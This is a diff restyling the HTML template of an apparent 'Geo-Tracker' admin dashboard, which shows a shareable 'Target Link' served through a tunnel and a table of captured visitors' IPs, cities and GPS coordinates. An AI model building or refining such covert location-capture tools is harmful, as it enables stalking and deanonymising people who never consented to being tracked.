@@ -3,57 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geo-Tracker Admin Panel</title>
+    <title>Geo-Tracker Admin</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        body { background: #0f172a; color: white; }
+        body { background: #0f172a; color: white; font-family: 'Inter', sans-serif; }
     </style>
 </head>
-<body class="p-5 md:p-10">
+<body class="p-5">
     <div class="max-w-4xl mx-auto">
-        <h1 class="text-3xl font-bold text-green-400 mb-5">📍 Geo-Tracker Dashboard</h1>
+        <h1 class="text-2xl font-bold text-green-400 mb-6 flex items-center">📍 Geo-Tracker Dashboard</h1>
         
         <div class="glass p-6 rounded-2xl mb-8">
-            <h2 class="text-lg font-semibold mb-3">Your Tracking Link</h2>
-            <div class="flex gap-2">
+            <h2 class="text-sm font-medium text-gray-400 mb-2">Target Link (Click to Copy)</h2>
+            <div class="relative">
                 <input id="trackLink" type="text" readonly value="{{ tunnel_url }}" 
-                       class="w-full bg-black/40 p-3 rounded-lg border border-gray-700 text-green-400">
-                <button onclick="copyLink()" class="bg-green-600 hover:bg-green-500 px-6 py-2 rounded-lg font-bold transition">Copy</button>
+                       onclick="copyLink()"
+                       class="w-full bg-black/40 p-4 rounded-xl border border-gray-700 text-green-400 cursor-pointer focus:outline-none">
+                <div id="copyBadge" class="hidden absolute right-4 top-4 bg-green-600 text-xs px-2 py-1 rounded">Copied!</div>
             </div>
-            <p id="copyMsg" class="text-xs mt-2 text-gray-400 h-4"></p>
         </div>
 
         <div class="glass rounded-2xl overflow-hidden">
-            <div class="p-5 border-b border-gray-700 flex justify-between items-center">
-                <h2 class="text-lg font-semibold">Captured Locations</h2>
-                <button onclick="location.reload()" class="text-sm bg-blue-600 px-3 py-1 rounded">Refresh</button>
+            <div class="p-4 border-b border-gray-700 flex justify-between items-center bg-white/5">
+                <h2 class="font-semibold">Live Captured Data</h2>
+                <button onclick="location.reload()" class="bg-blue-600 hover:bg-blue-500 text-xs px-4 py-2 rounded-lg transition">Refresh Logs</button>
             </div>
-            <div class="overflow-x-auto">
-                <table class="w-full text-left">
-                    <thead class="bg-white/5 text-gray-300">
-                        <tr>
-                            <th class="p-4">Time</th>
-                            <th class="p-4">IP & City</th>
-                            <th class="p-4">Coordinates</th>
-                            <th class="p-4">Action</th>
-                        </tr>
-                    </thead>
-                    <tbody id="dataTable">
-                        {% for log in logs %}
-                        <tr class="border-t border-gray-800 hover:bg-white/5">
-                            <td class="p-4 text-sm">{{ log.time }}</td>
-                            <td class="p-4 text-sm">{{ log.ip }}<br><span class="text-blue-400">{{ log.city }}</span></td>
-                            <td class="p-4 text-sm font-mono text-green-400">{{ log.lat }}, {{ log.lon }}</td>
-                            <td class="p-4">
-                                <a href="https://www.google.com/maps?q={{ log.lat }},{{ log.lon }}" target="_blank" 
-                                   class="text-xs bg-gray-700 px-3 py-1 rounded hover:bg-gray-600">View Map</a>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    </tbody>
-                </table>
-            </div>
+            <table class="w-full text-left text-sm">
+                <thead class="bg-black/20 text-gray-400">
+                    <tr>
+                        <th class="p-4">Time</th>
+                        <th class="p-4">City & IP</th>
+                        <th class="p-4">Map View</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for log in logs %}
+                    <tr class="border-t border-gray-800 hover:bg-white/5">
+                        <td class="p-4">{{ log.time }}</td>
+                        <td class="p-4 text-blue-400">{{ log.city }}<br><span class="text-gray-500 text-xs">{{ log.ip }}</span></td>
+                        <td class="p-4">
+                            <a href="https://www.google.com/maps?q={{ log.lat }},{{ log.lon }}" target="_blank" 
+                               class="text-green-500 hover:underline">View GPS</a>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
         </div>
     </div>
 
@@ -62,10 +58,9 @@
             var copyText = document.getElementById("trackLink");
             copyText.select();
             document.execCommand("copy");
-            const msg = document.getElementById("copyMsg");
-            msg.innerText = "Link copied to clipboard! ✅";
-            msg.classList.add("text-green-400");
-            setTimeout(() => { msg.innerText = ""; }, 3000);
+            const badge = document.getElementById("copyBadge");
+            badge.classList.remove("hidden");
+            setTimeout(() => badge.classList.add("hidden"), 2000);
         }
     </script>
 </body>
